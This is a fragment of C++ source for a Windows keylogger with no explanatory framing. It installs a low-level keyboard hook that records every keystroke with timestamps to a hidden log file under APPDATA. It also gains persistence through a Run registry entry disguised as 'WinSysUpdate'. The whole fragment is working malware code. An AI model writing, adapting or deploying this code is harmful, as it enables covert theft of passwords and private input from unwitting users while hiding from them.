        #include <ctime>

        HHOOK hHook = NULL;
        std::ofstream logFile;

        LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
                DWORD vkCode = pKey->vkCode;
                char key[32];
                
                if (vkCode >= 0x20 && vkCode <= 0x7E) {
                    key[0] = (char)vkCode;
                    key[1] = 0;
                } else {
                    switch (vkCode) {
                        case VK_RETURN: strcpy_s(key, "[ENTER]"); break;
                        case VK_SPACE: strcpy_s(key, " "); break;
                        case VK_TAB: strcpy_s(key, "[TAB]"); break;
                        case VK_BACK: strcpy_s(key, "[BACK]"); break;
                        case VK_SHIFT: strcpy_s(key, "[SHIFT]"); break;
                        case VK_CONTROL: strcpy_s(key, "[CTRL]"); break;
                        case VK_MENU: strcpy_s(key, "[ALT]"); break;
                        case VK_ESCAPE: strcpy_s(key, "[ESC]"); break;
                        default: sprintf_s(key, "[%d]", vkCode); break;
                    }
                }
                
                time_t now = time(0);
                struct tm tstruct;
                char buf[80];
                localtime_s(&tstruct, &now);
                strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tstruct);
                
                logFile << buf << " - " << key << std::endl;
                logFile.flush();
            }
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        void SetPersistence() {
            HKEY hKey;
            char path[MAX_PATH];
            GetModuleFileNameA(NULL, path, MAX_PATH);
            
            RegOpenKeyExA(HKEY_CURRENT_USER, 
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_SET_VALUE, &hKey);
            RegSetValueExA(hKey, "WinSysUpdate", 0, REG_SZ, 
                (BYTE*)path, strlen(path) + 1);
            RegCloseKey(hKey);
        }

        int main() {
            char logPath[MAX_PATH];
            GetEnvironmentVariableA("APPDATA", logPath, MAX_PATH);
            strcat_s(logPath, "\\WinSys\\kbd.log");
            
            logFile.open(logPath, std::ios::app);
            if (!logFile.is_open()) return 1;
            
            SetPersistence();
            
            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
            if (hHook == NULL) return 1;
            
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            
            UnhookWindowsHookEx(hHook);
            logFile.close();
            return 0;
        }
